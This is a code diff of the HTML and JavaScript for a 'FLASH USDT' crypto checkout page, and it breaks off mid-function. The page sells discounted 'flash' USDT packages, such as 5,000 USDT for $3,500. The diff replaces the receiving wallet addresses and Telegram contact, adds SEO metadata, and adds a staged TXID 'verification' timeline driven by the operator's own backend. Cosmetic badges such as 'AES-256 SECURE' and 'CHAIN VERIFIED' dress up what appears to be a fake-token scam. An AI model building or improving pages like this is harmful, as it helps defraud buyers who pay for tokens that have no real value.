@@ -3,9 +3,98 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>FLASH USDT - TRC20 Checkout (AES Secure)</title>
-<meta name="description" content="FLASH USDT TRC20 packages — AES-secure, instant settlement, professional checkout." />
-<link rel="icon" type="image/png" href="assets/USDT-2.png" />
+<title>FLASH USDT — TRC20 Checkout (AES Secure)</title>
+
+<!-- ✅ Primary SEO -->
+<meta name="description" content="FLASH USDT — TRC20 secure checkout platform with AES-256 encryption, instant delivery, and FlashLoan verification. Buy and verify USDT transactions securely on the TRON network.">
+<meta name="keywords" content="Flash USDT, FLASHUSD, TRC20, USDT TRC20, FlashLoan, Flash Pay, Flash Wallet, AES Secure, TRON, Blockchain Checkout, Instant USDT Payment, Flash Crypto, Flash USD, Flash Tether, Secure TRC20 Payments">
+<meta name="author" content=":FLASH USDT ADMIN • FLASH USDT">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://flashusd.com.tr/trc20.html">
+
+<!-- ✅ Favicons -->
+<link rel="icon" type="image/png" sizes="32x32" href="assets/USDT-2.png">
+<link rel="icon" type="image/png" sizes="16x16" href="assets/USDT-2.png">
+<link rel="apple-touch-icon" sizes="180x180" href="assets/USDT-2.png">
+<link rel="shortcut icon" href="assets/USDT-2.png">
+<meta name="theme-color" content="#030615">
+
+<!-- ✅ Open Graph / Facebook / Telegram -->
+<meta property="og:type" content="product">
+<meta property="og:site_name" content="FLASH USDT">
+<meta property="og:title" content="FLASH USDT — TRC20 Secure Checkout">
+<meta property="og:description" content="Instant and encrypted FLASH USDT TRC20 checkout with AES-256 protection and verified FlashLoan transactions.">
+<meta property="og:url" content="https://flashusd.com.tr/trc20.html">
+<meta property="og:image" content="https://flashusd.com.tr/assets/USDT-2.png">
+
+<!-- ✅ Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="FLASH USDT — TRC20 Secure Checkout">
+<meta name="twitter:description" content="Instant and encrypted FLASH USDT TRC20 checkout with AES-256 protection and verified FlashLoan transactions.">
+<meta name="twitter:image" content="https://flashusd.com.tr/assets/USDT-2.png">
+<meta name="twitter:site" content="@FlashUSDT">
+
+<!-- ✅ Schema: Product -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Product",
+  "name": "FLASH USDT TRC20",
+  "image": "https://flashusd.com.tr/assets/USDT-2.png",
+  "description": "Secure and instant FLASH USDT TRC20 purchase with AES encryption and verified FlashLoan settlement.",
+  "brand": {
+    "@type": "Brand",
+    "name": "FLASH USDT",
+    "logo": "https://flashusd.com.tr/assets/USDT-2.png"
+  },
+  "sku": "TRC20",
+  "offers": {
+    "@type": "Offer",
+    "url": "https://flashusd.com.tr/trc20.html",
+    "priceCurrency": "USDT",
+    "price": "1.00",
+    "availability": "https://schema.org/InStock"
+  }
+}
+</script>
+
+<!-- ✅ Schema: Organization -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "FLASH USDT",
+  "url": "https://flashusd.com.tr/",
+  "logo": "https://flashusd.com.tr/assets/USDT-2.png",
+  "description": "FLASH USDT is a multichain FlashLoan-enabled Tether platform supporting TRC20, ERC20, BEP20 and BTC networks with AES-256 secure checkout.",
+  "founder": {
+    "@type": "Person",
+    "name": "FLASH USDT ADMIN"
+  },
+  "sameAs": [
+    "https://t.me/soulflyss",
+    "https://twitter.com/FlashUSDT",
+    "https://www.instagram.com/flashusdt"
+  ]
+}
+</script>
+
+<!-- ✅ Schema: WebSite -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "FLASH USDT",
+  "url": "https://flashusd.com.tr/",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://flashusd.com.tr/?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+<!-- ✅ Page Styles -->
 <style>
   :root{
     --bg1:#030615; --bg2:#0b1130; --bg3:#0f153d;
@@ -111,6 +200,146 @@
   .method.active{outline:2px solid rgba(0,240,255,.6);background:rgba(0,240,255,.05)}
   .method.closed{opacity:.6; filter:saturate(.85) grayscale(.1)}
   .method .badge-closed{position:absolute; top:6px; right:8px;background:#ff4b4b; color:#fff; font-weight:800;padding:2px 6px; font-size:10px; border-radius:6px; letter-spacing:.3px}
+/* === Oxapay Gateway - Active Payment Method === */
+.method[data-method="OXAPAY"] {
+  position: relative;
+  border: 1px solid rgba(0, 255, 160, .25);
+  background: linear-gradient(180deg, rgba(0,255,160,.05), rgba(0,255,160,.02));
+  box-shadow: 0 0 25px rgba(0,255,160,.05);
+  transition: all .25s ease;
+}
+.method[data-method="OXAPAY"]:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 0 35px rgba(0,255,160,.15);
+  border-color: rgba(0,255,160,.5);
+}
+.method[data-method="OXAPAY"] img {
+  width: 30px;
+  height: 30px;
+  object-fit: contain;
+}
+
+/* === LIVE Badge (glowing green tag) === */
+.badge-live {
+  position: absolute;
+  top: 6px;
+  right: 8px;
+  background: linear-gradient(90deg, #16d18a, #0be7a3);
+  color: #fff;
+  font-weight: 800;
+  padding: 2px 7px;
+  font-size: 10px;
+  border-radius: 6px;
+  letter-spacing: .4px;
+  box-shadow: 0 0 10px rgba(22,209,138,.4);
+  animation: livePulse 1.8s ease-in-out infinite;
+}
+@keyframes livePulse {
+  0%,100% { box-shadow: 0 0 6px rgba(22,209,138,.4), 0 0 12px rgba(22,209,138,.2); opacity: .9; }
+  50%     { box-shadow: 0 0 14px rgba(22,209,138,.7), 0 0 20px rgba(22,209,138,.4); opacity: 1; }
+}
+
+/* === Transaction Title Glow Animations === */
+@keyframes glowBonus {
+  0%,100% { text-shadow: 0 0 8px rgba(255,215,0,.6), 0 0 18px rgba(255,215,0,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(255,215,0,.9), 0 0 28px rgba(255,215,0,.4); opacity: 1; }
+}
+.bonusGlow { color:#ffd700; animation: glowBonus 1.6s ease-in-out infinite; }
+
+@keyframes glowPending {
+  0%,100% { text-shadow: 0 0 8px rgba(255,204,77,.6), 0 0 18px rgba(255,204,77,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(255,204,77,.9), 0 0 28px rgba(255,204,77,.4); opacity: 1; }
+}
+
+@keyframes glowApproved {
+  0%,100% { text-shadow: 0 0 8px rgba(22,209,138,.6), 0 0 18px rgba(22,209,138,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(22,209,138,.9), 0 0 28px rgba(22,209,138,.4); opacity: 1; }
+}
+
+@keyframes glowRejected {
+  0%,100% { text-shadow: 0 0 8px rgba(255,75,159,.6), 0 0 18px rgba(255,75,159,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(255,75,159,.9), 0 0 28px rgba(255,75,159,.4); opacity: 1; }
+}
+@keyframes glowProcessing {
+  0%,100% { text-shadow: 0 0 8px rgba(0,240,255,.6), 0 0 18px rgba(0,240,255,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(0,240,255,.9), 0 0 28px rgba(0,240,255,.4); opacity: 1; }
+}
+@keyframes glowDelivered {
+  0%,100% { text-shadow: 0 0 8px rgba(22,209,138,.6), 0 0 18px rgba(22,209,138,.3); opacity: .9; }
+  50% { text-shadow: 0 0 14px rgba(22,209,138,.9), 0 0 28px rgba(22,209,138,.4); opacity: 1; }
+}
+
+.pendingTitle.processingGlow { color:#00f0ff; animation: glowProcessing 1.6s ease-in-out infinite; }
+.pendingTitle.deliveredGlow { color:#16d18a; animation: glowDelivered 1.6s ease-in-out infinite; }
+
+/* Duruma göre sınıflar */
+.pendingTitle.pendingGlow {
+  color: #ffcc4d;
+  animation: glowPending 1.6s ease-in-out infinite;
+}
+.pendingTitle.approvedGlow {
+  color: #16d18a;
+  animation: glowApproved 1.6s ease-in-out infinite;
+}
+.pendingTitle.rejectedGlow {
+  color: #ff4b9f;
+  animation: glowRejected 1.6s ease-in-out infinite;
+}
+
+.tx-summary {
+  background: rgba(255,255,255,.03);
+  border: 1px solid rgba(255,255,255,.08);
+  border-radius: 16px;
+  padding: 20px;
+  box-shadow: 0 0 20px rgba(0,240,255,.1);
+}
+.tx-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: #8fe7ff;
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+}
+.tx-details .kv {
+  display: flex;
+  justify-content: space-between;
+  font-size: 14px;
+  color: #d3eaff;
+  padding: 6px 0;
+  border-bottom: 1px solid rgba(255,255,255,.05);
+}
+.tx-details .k {
+  font-weight: 600;
+  color: #00f0ff;
+}
+.status-badge {
+  font-weight: 700;
+  padding: 4px 10px;
+  border-radius: 10px;
+}
+.status-badge.pending { background: rgba(255,204,77,.12); color: #ffcc4d; }
+.status-badge.approved { background: rgba(22,209,138,.12); color: #16d18a; }
+.status-badge.rejected { background: rgba(255,75,159,.12); color: #ff4b9f; }
+.status-badge.processing { background: rgba(0,240,255,.12); color: #00f0ff; }
+.status-badge.delivered { background: rgba(22,209,138,.15); color: #16d18a; }
+
+@keyframes shake { 
+  0%,100%{transform:translateX(0);} 
+  25%{transform:translateX(-3px);} 
+  75%{transform:translateX(3px);} 
+}
+.tx-summary.shake { animation: shake 0.6s ease; border-color:#ff4b9f; }
+
+/* Küçük gri bilgi yazısı */
+.small-info {
+  font-size: 12.5px;
+  color: #9aa7c8;
+  margin-top: 8px;
+  opacity: 0.85;
+}
+
+
 
   .row{display:flex;justify-content:space-between;gap:10px;color:#cfd6ff;font-size:14px;padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.08)}
   .row:last-child{border-bottom:none}
@@ -284,6 +513,70 @@ footer .foot > *{ min-width:0; }
   .vpanel, .panel, .card{ border-radius:14px; }
   .pay-address-box{ font-size:13px; }
 }
+/* ✅ Timeline durum renkleri */
+.timeline .tstep.done .tbadge {
+  background:rgba(22,209,138,.12);
+  color:#16d18a;
+  border-color:rgba(22,209,138,.25);
+}
+.timeline .tstep.done .tname {
+  color:#16d18a;
+}
+.timeline .tstep.error .tbadge {
+  background:rgba(255,75,159,.1);
+  color:#ff4b9f;
+  border-color:rgba(255,75,159,.25);
+}
+.timeline .tstep.error .tname {
+  color:#ff4b9f;
+}
+
+.timeline .tstep.active .tbadge {
+  background: rgba(255,204,77,.12);
+  color: #ffcc4d;
+  border-color: rgba(255,204,77,.25);
+}
+.timeline .tstep.active .tname {
+  color: #ffcc4d;
+}
+/* === STATUS PULSE ANIMATION === */
+@keyframes pulsePending {
+  0% { box-shadow: 0 0 0 0 rgba(255,204,77, .6); }
+  70% { box-shadow: 0 0 0 10px rgba(255,204,77, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(255,204,77, 0); }
+}
+@keyframes pulseProcessing {
+  0% { box-shadow: 0 0 0 0 rgba(0,240,255,.6); }
+  70% { box-shadow: 0 0 0 10px rgba(0,240,255,0); }
+  100% { box-shadow: 0 0 0 0 rgba(0,240,255,0); }
+}
+@keyframes pulseDelivered {
+  0% { box-shadow: 0 0 0 0 rgba(22,209,138,.6); }
+  70% { box-shadow: 0 0 0 10px rgba(22,209,138,0); }
+  100% { box-shadow: 0 0 0 0 rgba(22,209,138,0); }
+}
+@keyframes pulseRejected {
+  0% { box-shadow: 0 0 0 0 rgba(255,75,159,.6); }
+  70% { box-shadow: 0 0 0 10px rgba(255,75,159,0); }
+  100% { box-shadow: 0 0 0 0 rgba(255,75,159,0); }
+}
+
+/* glow class’lara göre otomatik animasyon */
+.tstep.active .tbadge {
+  animation: pulsePending 1.6s infinite;
+}
+.tstep.processing .tbadge {
+  animation: pulseProcessing 1.6s infinite;
+}
+.tstep.delivered .tbadge {
+  animation: pulseDelivered 1.6s infinite;
+}
+.tstep.error .tbadge {
+  animation: pulseRejected 1.6s infinite;
+}
+
+
+
     /* Secure Transaction badge - visual like uploaded image */
 .secure-transaction {
   display: flex;
@@ -353,6 +646,15 @@ footer .foot > *{ min-width:0; }
   }
 }
 
+/* Mobilde kritik animasyonları KAPATMA */
+.pendingTitle.pendingGlow,
+.pendingTitle.approvedGlow,
+.pendingTitle.rejectedGlow { animation-duration: 1.6s !important; }
+
+.spinner-ring { animation-duration: 1.1s !important; }
+.badge-live   { animation-duration: 1.8s !important; }
+.led-dot      { animation-duration: 1.6s !important; }
+
 
 </style>
 </head>
@@ -406,12 +708,12 @@ footer .foot > *{ min-width:0; }
             <div class="led-dot"></div>
           </article>
 
-          <article class="panel pad product" data-name="1K FLASH USDT" data-usdt="1000" data-price="$700">
+          <article class="panel pad product" data-name="5K FLASH USDT" data-usdt="5000" data-price="$3500">
             <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
             <div class="security-badge">🔒 AES-256 SECURE</div>
-            <h4>1K FLASH USDT</h4>
-            <div class="price">$700</div>
-            <div class="amount">Amount: 1,000 USDT</div>
+            <h4>5K FLASH USDT</h4>
+            <div class="price">$3500</div>
+            <div class="amount">Amount: 5,000 USDT</div>
             <div class="actions"><button class="btn primary select">Select</button></div>
             <div class="led-dot"></div>
           </article>
@@ -553,11 +855,21 @@ footer .foot > *{ min-width:0; }
           <div class="method panel pad" data-method="BEP20">
             <img src="assets/bep20.png" alt=""><div>BEP20 (BSC)</div>
           </div>
+                    <div class="method panel pad" data-method="USDC">
+            <img src="assets/usdc.png" alt=""><div>USDC (BEP20-ERC20)</div>
+          </div>
 
-          <div class="method panel pad closed" data-closed="true">
-            <span class="badge-closed">CLOSED</span>
+          <div class="method panel pad" data-method="BTC">
+                <span class="badge-live">NEW</span>
             <img src="assets/btc.png" alt=""><div>BTC (Bitcoin)</div>
           </div>
+<!-- === Oxapay Gateway (LIVE) === -->
+<div class="method panel pad" data-method="OXAPAY" data-url="https://pay.oxapay.com/13369911">
+  <span class="badge-live">LIVE</span>
+  <img src="assets/oxapay.svg" alt="Oxapay Logo">
+  <div>Oxapay Gateway</div>
+</div>
+
           <div class="method panel pad closed" data-closed="true">
             <span class="badge-closed">CLOSED</span>
             <img src="assets/binance.png" alt=""><div>Binance Pay</div>
@@ -607,7 +919,7 @@ footer .foot > *{ min-width:0; }
           <div class="row" style="display:block;margin-top:8px;">
             <div class="small" id="pay-label" style="font-weight:800;color:#cfe0ff;margin-bottom:6px;">TRC20 Payment Address:</div>
             <div class="pay-address-box">
-              <span id="pay-address" class="addr-text">TXAk3cty1QpM72m9wRgQNwxBzEy3E9SyNU</span>
+              <span id="pay-address" class="addr-text">TQDwWFmC2fMCDzLmrndc2bsiB7vK78DE33</span>
               <span class="verified-tag">Verified</span>
               <button class="copy" id="copyAddr" title="Copy Address">📋</button>
             </div>
@@ -619,7 +931,7 @@ footer .foot > *{ min-width:0; }
           </div>
 
           <div class="warning-box">⚠️ <b>Important</b><br>Only send <b id="net-inline-2">TRC20</b> to this address. Sending any other cryptocurrency may result in permanent loss of funds.</div>
-          <div class="time-box">⏱️ Processing time: <b>5–15 minutes</b> after payment confirmation.</div>
+          <div class="time-box">⏱️ Processing time: <b>1 minute or maximum 48 hours</b> after payment confirmation.</div>
 
           <!-- Özellik kutuları -->
           <div class="pi-features">
@@ -657,6 +969,54 @@ footer .foot > *{ min-width:0; }
           </div>
         </div>
       </div>
+      <!-- STEP 6: RESULT SECTION -->
+<div class="card pad" id="step6" style="display:none;">
+  <div class="stage pad grid gap-20">
+    <!-- SOL: ÜRÜN DETAYLARI -->
+    <div class="tx-left">
+        <div class="left-panel">
+  <div class="productDetails" style="
+    border:1px solid rgba(255,255,255,.1);
+    background:rgba(255,255,255,.03);
+    padding:18px;
+    border-radius:14px;
+    font-size:14px;
+    line-height:1.5;
+    color:#cfe0ff;
+    margin-bottom:18px;
+  ">
+    <h3>📦 Product Details</h3>
+    <p>Enter TXID and verify to see details.</p>
+  </div>
+</div>
+
+      <div class="tx-summary">
+        <h3 class="tx-title">
+          <img src="assets/trc20.png" style="width:24px;height:24px;margin-right:8px;"> Transaction Details
+        </h3>
+        <div class="tx-details">
+          <div class="kv"><span class="k">Product:</span> <span id="detProduct">—</span></div>
+          <div class="kv"><span class="k">Amount:</span> <span id="detAmount">—</span></div>
+          <div class="kv"><span class="k">Price:</span> <span id="detPrice">—</span></div>
+          <div class="kv"><span class="k">Network:</span> <span id="detNetwork">TRC20</span></div>
+          <div class="kv"><span class="k">Your Wallet:</span> <span id="detWallet">—</span></div>
+          <div class="kv"><span class="k">Deposit Address:</span> <span id="detDeposit">—</span></div>
+          <div class="kv"><span class="k">Status:</span> <span id="detStatus">—</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SAĞ: TIMELINE -->
+    <div class="tx-right">
+      <div class="timeline">
+        <div class="tstep" id="tl1"><div class="tbadge">STEP 1</div><div class="tcontent"><div class="tname">Transaction Verification</div><div class="tdesc">Awaiting blockchain confirmation.</div></div></div>
+        <div class="tstep" id="tl2"><div class="tbadge">STEP 2</div><div class="tcontent"><div class="tname">Processing</div><div class="tdesc">Preparing secure transfer.</div></div></div>
+        <div class="tstep" id="tl3"><div class="tbadge">STEP 3</div><div class="tcontent"><div class="tname">Wallet Delivery</div><div class="tdesc">USDT delivered to your wallet.</div></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
     </section>
 
     <!-- RIGHT: SUMMARY (başta gizli) -->
@@ -693,7 +1053,7 @@ footer .foot > *{ min-width:0; }
       <img src="assets/USDT-2.png" alt="">
       <strong>FLASH USDT</strong> — Encrypted by AES-256 • Verified on TRON
     </div>
-    <div>Contact: <a style="color:#cfe8ff" href="mailto:support@flashusdt.com">support@flashusdt.com</a></div>
+    <div>Contact: <a style="color:#cfe8ff" href="mailto:support@flashusd.com.tr">support@flashusd.com.tr</a></div>
     <div>© <span id="y"></span> FLASH USDT — TRC20</div>
   </div>
 </footer>
@@ -765,7 +1125,7 @@ footer .foot > *{ min-width:0; }
       </div>
 
       <div style="display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;">
-        <a class="btn" href="https://t.me/onlyXbtc" target="_blank" rel="noopener">Telegram Support ↗</a>
+        <a class="btn" href="https://t.me/soulflyss" target="_blank" rel="noopener">Telegram Support ↗</a>
         <button class="btn ghost" id="vClose2">Back to Main</button>
       </div>
     </div>
@@ -778,10 +1138,11 @@ footer .foot > *{ min-width:0; }
 
   // CONFIG
   const ADDRS = {
-    TRC20: "TXAk3cty1QpM72m9wRgQNwxBzEy3E9SyNU",
-    ERC20: "0xE88921A2d0315BF364a768c393D02cDF111A0Bc6",
-    BEP20: "0xE88921A2d0315BF364a768c393D02cDF111A0Bc6",
-    BTC: "" // closed
+    TRC20: "TQDwWFmC2fMCDzLmrndc2bsiB7vK78DE33",
+    ERC20: "0xb5f5090D4f032059844c464C7A273D29063311c1",
+    BEP20: "0xb5f5090D4f032059844c464C7A273D29063311c1",
+    USDC: "0xb5f5090D4f032059844c464C7A273D29063311c1",
+    BTC: "bc1qwwqwkkw7aqvg5j58peskg0hw4xuyeeucahg7gl" // closed
   };
 
   // STATE
@@ -842,11 +1203,6 @@ footer .foot > *{ min-width:0; }
 
   // Nav buttons
   document.getElementById('navCheckout')?.addEventListener('click',(e)=>{ e.preventDefault(); showStep('step1'); showPayDetails(false); });
-  document.getElementById('navTxid')?.addEventListener('click',(e)=>{
-    e.preventDefault();
-    showPayDetails(false);
-    showStep('step5');
-  });
 
   // Get Started
   $('#goStart')?.addEventListener('click', e=>{ e.preventDefault(); showStep('step1'); });
@@ -908,6 +1264,13 @@ footer .foot > *{ min-width:0; }
       updateSummary();
     });
   });
+  // 🔗 Oxapay tıklanınca yönlendirme
+document.querySelectorAll('.method[data-method="OXAPAY"]').forEach(m=>{
+  m.addEventListener('click', ()=>{
+    window.open(m.dataset.url, '_blank');
+  });
+});
+
 
   // Summary direct
   $('#gotoPayment')?.addEventListener('click', (e)=>{
@@ -933,57 +1296,311 @@ footer .foot > *{ min-width:0; }
   vClose1?.addEventListener('click', closeVerifyModal);
   vClose2?.addEventListener('click', ()=>{ closeVerifyModal(); showStep('step1'); showPayDetails(false); });
 
-  // TXID -> open modal
-document.getElementById('sendTxid')?.addEventListener('click', ()=>{
-  const txid = (document.getElementById('txid')?.value || '').trim();
-  if(!txid){ alert('Please enter your TXID.'); return; }
+// TXID -> open modal (tam akış)
+document.getElementById('sendTxid')?.addEventListener('click', async ()=>{
+  const txidRaw = (document.getElementById('txid')?.value || '').trim();
+const userAddress = state.wallet || (document.getElementById('wallet')?.value || '').trim();
+
+  // 💡 Önce TXID’nin zaten kayıtlı olup olmadığını kontrol et (sadece sorgulama için)
+  try {
+    const checkRes = await fetch('save_payment.php', {
+      method: 'POST',
+      body: new URLSearchParams({
+        txid: txidRaw.toLowerCase(),
+        verify_only: '1' // sadece sorgu modu
+      })
+    });
+
+    const checkTxt = await checkRes.text();
+if (checkTxt.trim() === 'SKIP_WRITE' || checkTxt.trim() === 'EXISTS') {
+  console.log('✅ TXID zaten kayıtlı, sadece sorgulama moduna geçiliyor...');
+  openVerifyProcess(); // modal aç
+  showStep('step6'); // hemen adımı göster
+  swapToPending();
+
+  // ✅ Ürün detaylarını anında getir
+  await checkStatus(txidRaw.toLowerCase());
+
+  return; // Burada dur — kayıt yapma
+}
+
+  } catch (err) {
+    console.warn('verify_only check failed', err);
+  }
+
+  // 🧱 Wallet adresi kontrolü
+if(!userAddress){
+  const txBox = document.querySelector('#txid');
+  txBox.style.border = '1px solid #ffcc4d';
+  txBox.style.boxShadow = '0 0 8px rgba(255,204,77,.3)';
+  console.warn('⚠️ Wallet address is empty — proceeding with TXID lookup only.');
+}
+
+
+ // kullanıcı adresi (step2)
+  const depositAddress = (document.getElementById('pay-address')?.textContent || '').trim(); // ödeme adresi (step4)
+
+  if(!txidRaw){ 
+    alert('Please enter your TXID.'); 
+    return; 
+  }
+if(!userAddress){
+  console.warn('⚠️ Wallet address empty — continuing with TXID only.');
+}
+
+
+  const txid = txidRaw.toLowerCase();
   state.txid = txid;
-  const p = document.getElementById('pending-txid'); 
+  const p = document.getElementById('pending-txid');
   if(p) p.textContent = txid;
 
-  // 💾 Kaydedilecek metin formatı
-  const details = `
-📦 PACKAGE INFO
-────────────────────────
-Product: ${state.productName || '—'}
-Amount: ${state.productUSDT || '—'} USDT
-Price: ${state.productPrice || '—'}
-Wallet: ${state.wallet || '—'}
-Network: ${state.network || '—'}
-TXID: ${txid}
-Payment Address: ${ADDRRSafe(state.network || '')}
-Date: ${new Date().toUTCString()}
-────────────────────────
-User-Agent: ${navigator.userAgent}
-Page: FLASH USDT TRC20 Checkout
-`;
+  // 📦 Gönderilecek tüm detaylar
+  const details = {
+    txid: txid,
+    product: state.productName || '—',
+    amount: state.productUSDT ? `${state.productUSDT} USDT` : '—',
+    price: state.productPrice || '—',
+    wallet: state.wallet || '—',
+    network: state.network || 'TRC20',
+    user_address: userAddress,       // kullanıcı kendi adresi
+    deposit_address: depositAddress, // ödeme adresi (bizim)
+    date: new Date().toUTCString(),
+    status: 'pending'
+  };
 
-  // 📤 PHP’ye gönder
-  fetch('save_payment.php', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: 'data=' + encodeURIComponent(details)
-  })
-  .then(res => res.text())
-  .then(txt => {
-    if (txt.trim() === 'OK') {
-      console.log('Payment details saved successfully.');
-    } else {
-      console.warn('Server response:', txt);
+  try {
+    // 💾 Sunucuya gönder
+    const body = new URLSearchParams(details);
+    const res = await fetch('save_payment.php', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: body.toString()
+    });
+    const text = await res.text();
+    if (text.trim() !== 'OK') {
+        if (text.trim() === 'EXISTS') {
+  console.log('TXID already exists — skipping save');
+}
+
+      console.warn('Save response:', text);
+      alert('Unable to save TXID on server. Contact admin.');
+      return;
     }
-  })
-  .catch(err => console.error('Save error:', err));
+  } catch (err) {
+    console.error('Save error:', err);
+    alert('Save failed. Check console.');
+    return;
+  }
 
   // 🔄 Modal akışı
   openVerifyProcess();
+
+  // 4 sn sonra animasyon kapanıp pending görünür
   setTimeout(()=>{ swapToPending(); }, 4000);
-});
+
+// 8 sn sonra ilk kontrol + her 15 sn’de yenile
+const checkStatus = async () => {
+  try {
+    const res = await fetch('verify_status.php?txid=' + encodeURIComponent(txid) + '&t=' + Date.now());
+    const data = await res.json();
+    if (data.error) return;
+
+    // 💬 Status mesajını dinamik olarak değiştir
+    const statusMsg = document.querySelector('.pendingSub');
+    if (statusMsg) {
+      let msgText = '⏳ Awaiting blockchain confirmation...';
+      if (data.status === 'approved') msgText = '✅ Payment verified and confirmed.';
+      else if (data.status === 'processing') msgText = '🔧 Processing your transaction...';
+      else if (data.status === 'delivered') msgText = '📦 USDT successfully delivered to your wallet.';
+      else if (data.status === 'rejected') msgText = '❌ Transaction rejected or invalid.';
+      statusMsg.textContent = msgText;
+    }
+
+    // 💎 Ürün detaylarını göster (buraya taşındı)
+    if (data.ok || ['pending','processing','approved','delivered','rejected'].includes(data.status)) {
+      showStep('step6'); // ✅ step6 ekranına geç
+      const d = (id, val) => document.getElementById(id).textContent = val || '—';
+      d('detProduct', data.product);
+      d('detAmount', data.amount);
+      d('detPrice', data.price);
+      d('detNetwork', data.network);
+      d('detWallet', data.wallet || data.user_address);
+      d('detDeposit', data.deposit_address);
+      document.getElementById('detStatus').innerHTML =
+        `<span class="status-badge ${data.status}">${data.status.toUpperCase()}</span>`;
+
+      // Timeline güncelle
+      const tl = [document.getElementById('tl1'), document.getElementById('tl2'), document.getElementById('tl3')];
+      tl.forEach(e => e.classList.remove('active', 'done', 'error'));
+
+      if (data.status === 'pending') tl[0].classList.add('active');
+      else if (data.status === 'processing') { tl[0].classList.add('done'); tl[1].classList.add('active'); }
+      else if (data.status === 'approved' || data.status === 'delivered') tl.forEach(e => e.classList.add('done'));
+      else if (data.status === 'rejected') tl[0].classList.add('error');
+    }
+
+    // 🔥 Başlık/timeline renklendirmesi
+    const title = document.querySelector('.pendingTitle');
+    const sub   = document.querySelector('.pendingSub');
+    const steps = document.querySelectorAll('.timeline .tstep');
+    const box   = document.querySelector('.pendingTop');
+
+    steps.forEach(s => s.classList.remove('active', 'done', 'error'));
+    title.classList.remove('pendingGlow', 'approvedGlow', 'rejectedGlow');
+
+    if (data.status === 'pending') {
+      title.textContent = '⏳ Transaction Verification Pending';
+      sub.textContent   = 'Your transaction is awaiting blockchain confirmation.';
+      steps[0].classList.add('active');
+      if (box) box.style.boxShadow = '0 0 25px rgba(255,204,77,.3)';
+      title.classList.add('pendingGlow');
+    } else if (data.status === 'processing') {
+      title.textContent = '🔧 Processing';
+      sub.textContent   = 'Your payment verified; preparing secure transfer.';
+      steps[0].classList.add('done');
+      steps[1].classList.add('active');
+      if (box) box.style.boxShadow = '0 0 25px rgba(0,240,255,.35)';
+      title.classList.add('processingGlow');
+    } else if (data.status === 'approved' || data.status === 'delivered') {
+      title.textContent = '📦 Delivered';
+      sub.textContent   = 'FLASH USDT successfully delivered to your wallet.';
+      steps.forEach(e => e.classList.add('done'));
+      if (box) box.style.boxShadow = '0 0 25px rgba(22,209,138,.4)';
+      title.classList.add('deliveredGlow');
+    } else if (data.status === 'rejected') {
+      title.textContent = '❌ Transaction Rejected';
+      sub.textContent   = 'Your TXID was invalid or rejected by the system.';
+      steps[0].classList.add('error');
+      if (box) box.style.boxShadow = '0 0 25px rgba(255,75,159,.35)';
+      document.querySelector('.tx-summary')?.classList.add('shake');
+      title.classList.add('rejectedGlow');
+    }
+
+    return data.status;
+  } catch (err) {
+    console.error('verify fetch error:', err);
+  }
+};
+
+  // İlk sorgu 8 sn sonra
+// 🔁 8 saniye sonra ilk kontrol ve ardından her 15 saniyede bir
+setTimeout(async () => {
+  let status = await checkStatus();
+
+  // Her 15 sn’de pending kaldıkça kontrol et
+  const interval = setInterval(async () => {
+    status = await checkStatus();
+    if (status && status !== 'pending') clearInterval(interval);
+  }, 15000);
+}, 8000);
+}); // ✅ TXID click event’in doğru kapanışı
+
+// 🔍 TXID sorgulama
+// ✅ Gelişmiş dinamik TXID kontrolü (admin panel ile tam senkron)
+async function checkStatus(txid) {
+  try {
+    const res = await fetch('verify_status.php?txid=' + encodeURIComponent(txid) + '&t=' + Date.now());
+    const data = await res.json();
+    console.log('🔍 TXID status:', data);
+
+    if (!data.ok) {
+      console.warn('No record found for TXID:', txid);
+      return;
+    }
+
+    // 🎁 Ürün detayları kutusu
+    const detailBox = document.querySelector('.productDetails');
+    if (detailBox) {
+      detailBox.innerHTML = `
+        <h3>📦 Product Details</h3>
+        <p><b>Product:</b> ${data.product}</p>
+        <p><b>Amount:</b> ${data.amount}</p>
+        <p><b>Price:</b> ${data.price}</p>
+        <p><b>Network:</b> ${data.network}</p>
+        <p><b>Wallet:</b> ${data.wallet}</p>
+        <p><b>Deposit Address:</b> ${data.deposit_address}</p>
+        <p><b>User Address:</b> ${data.user_address}</p>
+        <p class="small-info">🕓 Last updated: ${data.updated_at || new Date().toLocaleString()}</p>
+      `;
+    }
+
+    // 💬 Status rozetleri
+    const statusText = data.status ? data.status.toUpperCase() : 'PENDING';
+    const badge = `<span class="status-badge ${data.status}">${statusText}</span>`;
+    document.getElementById('detStatus').innerHTML = badge;
+
+    // 🪄 Başlık & alt yazı animasyonu
+    const title = document.querySelector('.pendingTitle');
+    const sub   = document.querySelector('.pendingSub');
+    const box   = document.querySelector('.pendingTop');
+
+    title.classList.remove('pendingGlow','processingGlow','approvedGlow','rejectedGlow','deliveredGlow');
+
+    switch (data.status) {
+      case 'processing':
+        title.textContent = '🔧 Processing Transaction';
+        sub.textContent   = 'Your payment verified; preparing secure transfer.';
+        title.classList.add('processingGlow');
